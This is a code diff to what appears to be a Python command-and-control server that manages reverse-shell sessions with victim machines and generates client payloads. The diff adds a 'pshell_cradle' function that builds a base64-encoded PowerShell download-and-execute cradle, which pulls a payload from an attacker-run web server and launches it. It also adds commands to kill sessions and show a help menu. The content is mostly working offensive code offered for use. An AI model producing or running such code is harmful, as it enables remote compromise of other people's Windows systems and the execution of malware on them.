@@ -1,5 +1,4 @@
 import socket
-import sys
 import threading
 from prettytable import PrettyTable
 import random
@@ -8,7 +7,16 @@ import os
 import os.path
 import shutil
 import subprocess
+from Cryptodome.Cipher import AES
+from Cryptodome.Random import get_random_bytes
+import base64
 
+def help():
+    print("MENU COMMANDS \n ---------------------------------------\n listener -g : Generate a new listener\n winclient.py - Generate a Windows compatible client\n linclient.py - Generate a Linux compatible payload\n execlient - Generate an executable payload for Windows\n pshell_cradle : Commands to send encrypted payload to Windows clients\n sessions -l : List sessions\n session -i <session number> : Enter the required session\n kill <session number> : Kill an active session\n \n")
+    print("SESSION COMMANDS \n ---------------------------------------\n background : Backgrounds the current session\n exit : Terminated the current session\n")
+def kill_sig(conn,msg):
+    msg = str(msg)
+    conn.send(msg.encode())
 def winclient():
     name = (''.join(random.choices(string.ascii_lowercase,k=7)))
     filename = name+".py"
@@ -76,6 +84,20 @@ def execlient():
     else:
         print("File not found")
 
+def pshell_cradle():
+    web_server_ip = input("Enter web server ip\n")
+    web_server_port = input("Enter web server port\n")
+    payload = input("Enter payload file with extension\n")
+    runner = (''.join(random.choices(string.ascii_lowercase,k=7))) + ".txt"
+    print(f"Enter following command to start a web server\n python3 -m http.server -b {web_server_ip} {web_server_port}")
+    runner_unencoded = f'iex (new-object new.webclient).downloadstring("http://{web_server_ip}:{web_server_port}/{runner}")'.encode("utf-16le")
+    with open(runner, 'w') as f:
+        f.write(f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload}; Start-Process -FilePath {payload}')
+        f.close()
+    base64_runner_unencoded = base64.b64encode(runner_unencoded)
+    base64_runner_unencoded = base64_runner_unencoded.decode()
+    print(f'Encoded Payload\n powershell -e {base64_runner_unencoded}')
+    
 def conn_handler():
     while True:
         if kill_flag==1:
@@ -178,6 +200,7 @@ def conn_in(conn):
     res = conn.recv(1024).decode()
     return res
 def conn_out(conn, msg):
+    msg = str(msg)
     conn.send(msg.encode())
 def listener_handler():
     sock.bind((host_ip, int(host_port)))
@@ -194,6 +217,8 @@ if __name__=='__main__':
     while True:
         try:
             command = input("Enter Command : ")
+            if command == "help":
+                help()
             if command == "listener -g":
                 host_ip=input("\nEnter the host ip to listen : ")
                 host_port=input("\nEnter host port to listen : ")
@@ -213,7 +238,9 @@ if __name__=='__main__':
                 if listener_count > 0:
                     execlient()
                 else:
-                    print("No active listner available")           
+                    print("No active listner available")
+            if command == "pshell_cradle":
+                pshell_cradle()           
             if command.split(" ")[0].lower() == "sessions":
                 session_counter=0
                 if command.split(" ")[1] == "-l":
@@ -234,6 +261,15 @@ if __name__=='__main__':
                             print("Session is already Dead")
                     except IndexError:
                         print(f'session {num} does not exist')
+            if command.split(" ")[0].lower() == "kill":
+                try:
+                    num = int(command.split(" ")[1])
+                    target_id = a[num][0]
+                    kill_sig(target_id,'exit')
+                    a[num][5] = "Dead"
+                    print(f'Terminated session {num}')
+                except (IndexError,ValueError):
+                    print(f"Session {num} not found")
         except KeyboardInterrupt:
             print("\n Keyboard interrupt issued")
             quit_msg=input("Do you want to quit?\n Press Y if Yes and N if No")
